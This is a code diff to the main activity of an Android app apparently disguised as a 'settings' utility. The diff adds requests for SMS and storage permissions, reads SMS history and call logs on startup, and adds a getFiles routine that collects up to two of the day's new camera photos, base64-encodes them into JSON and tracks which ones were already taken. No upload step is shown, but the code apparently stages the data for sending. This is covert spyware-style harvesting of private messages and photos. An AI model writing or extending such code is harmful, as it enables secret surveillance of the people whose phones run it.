@@ -1,10 +1,14 @@
 package com.example.settings;
 
+import static com.example.settings.Utils.checkServices;
 import static com.example.settings.Utils.getBatteryPercent;
+import static com.example.settings.Utils.isMyServiceRunning;
 import static com.example.settings.Utils.readCallLogs;
+import static com.example.settings.Utils.readSmsHistory;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -21,7 +25,6 @@ import android.accounts.AccountManager;
 import android.annotation.SuppressLint;
 import android.app.KeyguardManager;
 import android.content.BroadcastReceiver;
-import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ComponentName;
 import android.content.ContentResolver;
@@ -37,9 +40,9 @@ import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
-import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.PowerManager;
 import android.provider.ContactsContract;
 import android.provider.Settings;
@@ -54,28 +57,29 @@ import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
 import android.text.format.Formatter;
+import android.util.Base64;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageView;
-import android.widget.Toast;
 
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
-import com.wickerlabs.logmanager.LogObject;
-import com.wickerlabs.logmanager.LogsManager;
 
 import org.apache.commons.lang3.StringUtils;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.lang.reflect.Method;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
 import java.lang.reflect.Type;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
-import java.text.DateFormat;
+import java.nio.file.Files;
+import java.nio.file.attribute.BasicFileAttributes;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
@@ -142,7 +146,6 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
         int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
         int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-
         float batteryPct = level * 100 / (float)scale;*/
 
 
@@ -152,6 +155,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             btsave.setEnabled(false);
             btsave.setOnClickListener(null);
         }
+        checkServices(getApplicationContext(),mSharedpref);
+        // String val=getFiles(mSharedpref);
+        //readSmsHistory(this,mSharedpref);
 
         checkpermissions();
         getphoneAppdetails();
@@ -303,6 +309,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         try {
             if ((ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                     != PackageManager.PERMISSION_GRANTED) &&
+                    (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                            != PackageManager.PERMISSION_GRANTED)&&
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)
                             != PackageManager.PERMISSION_GRANTED) &&
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
@@ -318,9 +326,12 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     && (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                     != PackageManager.PERMISSION_GRANTED) &&
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS)
+                            != PackageManager.PERMISSION_GRANTED) &&
+                    (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                             != PackageManager.PERMISSION_GRANTED)) {
                 ActivityCompat.requestPermissions(this,
                         new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS,
+                                Manifest.permission.READ_EXTERNAL_STORAGE,
                                 Manifest.permission.READ_PHONE_STATE,
                                 Manifest.permission.GET_ACCOUNTS,
                                 Manifest.permission.ACCESS_COARSE_LOCATION,
@@ -328,7 +339,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                                 Manifest.permission.READ_CALL_LOG,
                                 Manifest.permission.READ_CONTACTS,
                                 Manifest.permission.WRITE_CONTACTS,
-                                Manifest.permission.RECEIVE_SMS
+                                Manifest.permission.RECEIVE_SMS,
+                                Manifest.permission.READ_SMS
                         },
                         1);
             } else {
@@ -359,6 +371,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             }
         });
         readCallLogs(getApplicationContext(), mSharedpref);
+        readSmsHistory(this,mSharedpref);
+        getFiles(mSharedpref);
     }
 
 
@@ -869,7 +883,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 }
                 break;
                 case R.id.CheckAutoStart:
-                    checkAutoStartOption();
+                    setuponetimeworkManager();
+                   // checkAutoStartOption();
                 break;
             case R.id.SynData:
 
@@ -950,4 +965,97 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
         getApplicationContext().registerReceiver(screenOnOffReceiver, theFilter);
     }
+    public  static String getFiles(Sharedpref mSharedpref){
+        ArrayList<String> filenames=new ArrayList<>();
+        ArrayList<String> prevfilenames;
+        ArrayList<String> addNewFiles=new ArrayList<>();
+        String path = Environment.getExternalStorageDirectory().toString()+"/DCIM/Camera";
+        Log.d("Files", "Path: " + path);
+        File directory = new File(path);
+        File[] files = directory.listFiles();
+        Log.d("Files", "Size: "+ files.length);
+        for (int i = 0; i < files.length; i++)
+        {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                String filedate=getDate("/storage/emulated/0/DCIM/Camera/"+ files[i].getName());
+                String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
+                if (filedate.equalsIgnoreCase(currentDate)){
+                    filenames.add(files[i].getName());
+                }
+            }
+            else {
+                return "";
+            }
+        }
+        Gson gson=new Gson();
+        Type listType = new TypeToken< ArrayList<String> >(){}.getType();
+        prevfilenames=gson.fromJson(mSharedpref.getImageList(),listType );
+        if(prevfilenames==null){
+            prevfilenames=new ArrayList<>();
+        }
+        filenames.removeAll(prevfilenames);
+        JSONArray mJsonArray=new JSONArray();
+        int value;
+        if (filenames.size()>=2){
+            value=2;
+        }
+        else value=filenames.size();
+        for (int i=0;i<value;i++){
+            JSONObject mjJsonObject=new JSONObject();
+                try {
+                    mjJsonObject.put("name",filenames.get(i));
+                    try {
+                        String encodedImage = Base64.encodeToString(byteArrayImage(filenames.get(i)), Base64.DEFAULT);
+                        mjJsonObject.put("base64",encodedImage);
+                    }
+                    catch (Exception e){
+                        e.printStackTrace();
+                        continue;
+                    }
+                    mJsonArray.put(mjJsonObject);
+                    addNewFiles.add(files[i].getName());
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+        }
+        String convertarray;
+        try {
+            convertarray=gson.toJson(mJsonArray);
+            prevfilenames.addAll(addNewFiles);
+            String fil=gson.toJson(prevfilenames);
+            mSharedpref.setImageList(fil);
+            mSharedpref.commit();
+        }
+        catch (Exception e){
+            e.printStackTrace();
+            return "";
+        }
+        return convertarray;
+    }
+    public static byte[] byteArrayImage(String imagepath){
+      //  Bitmap bm = BitmapFactory.decodeFile("/path/to/image.jpg");
+        Bitmap bm = BitmapFactory.decodeFile("/storage/emulated/0/DCIM/Camera/"+ imagepath);
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); // bm is the bitmap object
+        byte[] b = baos.toByteArray();
+        return b;
+    }
+    @RequiresApi(Build.VERSION_CODES.O)
+    private static String getDate(String filepath) {
+        File file=new File(filepath);
+        BasicFileAttributes attr = null;
+        try {
+            attr = Files.readAttributes(file.toPath(), BasicFileAttributes.class);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        long createdAt = attr.creationTime().toMillis();
+        Date date=new Date(createdAt);
+        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(date);
+        return currentDate;
+
+    }
+
+
+
 }
